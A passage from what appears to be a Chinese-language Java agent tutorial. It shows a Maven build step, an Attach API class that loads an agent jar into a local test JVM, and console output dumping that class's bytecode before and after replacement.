class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>

<p>打包</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mvn</span> clean install</span><br></pre></td></tr></table></figure>





<p><strong>第三步：编写Attach类：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shadowflow.sec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException,</span></span><br><span class="line"><span class="function">            AgentInitializationException, InterruptedException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取正在运行 JVM 列表</span></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历列表</span></span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor descriptor : list) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据进程名字获取进程ID, 并使用 loadAgent 注入进程</span></span><br><span class="line">            <span class="keyword">if</span> (descriptor.displayName().endsWith(<span class="string">&quot;MyClass&quot;</span>)) &#123;</span><br><span class="line">                System.out.println(descriptor.displayName());</span><br><span class="line">                VirtualMachine virtualMachine = VirtualMachine.attach(descriptor.id());</span><br><span class="line">                virtualMachine.loadAgent(<span class="string">&quot;/Users/shadowflow/code/java/javaagent-demo/target/javaagent-demo-1.0-SNAPSHOT.jar&quot;</span>, <span class="string">&quot;arg1&quot;</span>);</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行Attach类，结果如下</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/bin/</span>java -javaagent:<span class="regexp">/Applications/I</span>ntelliJ IDEA.app<span class="regexp">/Contents/</span>lib<span class="regexp">/idea_rt.jar=57991:/</span>Applications<span class="regexp">/IntelliJ IDEA.app/</span>Contents<span class="regexp">/bin -Dfile.encoding=UTF-8 -classpath /</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>charsets.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/deploy.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/cldrdata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/dnsns.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jaccess.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/jfxrt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/localedata.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/nashorn.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunec.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunjce_provider.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/sunpkcs11.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>ext<span class="regexp">/zipfs.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>javaws.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jce.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jfr.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/jfxswt.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>jsse.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/management-agent.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>plugin.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/jre/</span>lib<span class="regexp">/resources.jar:/</span>Library<span class="regexp">/Java/</span>JavaVirtualMachines<span class="regexp">/jdk1.8.0_301.jdk/</span>Contents<span class="regexp">/Home/</span>jre<span class="regexp">/lib/</span>rt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span><span class="keyword">ant</span>-javafx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>dt.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>javafx-mx.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>jconsole.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>packager.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>sa-jdi.jar:<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home<span class="regexp">/lib/</span>tools.jar:<span class="regexp">/Users/</span>shadowflow<span class="regexp">/code/</span>java<span class="regexp">/test/</span>target/classes com.shadowflow.test.MyClass</span><br><span class="line">Nice!</span><br><span class="line">Nice!</span><br><span class="line">com.shadowflow.test.MyClass.....</span><br><span class="line">com.shadowflow.test.MyClass类替换前的字节码:[-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">103</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">33</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">114</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">112</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">74</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, -<span class="number">78</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">18</span>, <span class="number">3</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">4</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">8</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>]</span><br><span class="line">com.shadowflow.test.MyClass类替换后的字节码:[-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">72</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">76</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">119</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">121</span>, <span class="number">78</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span 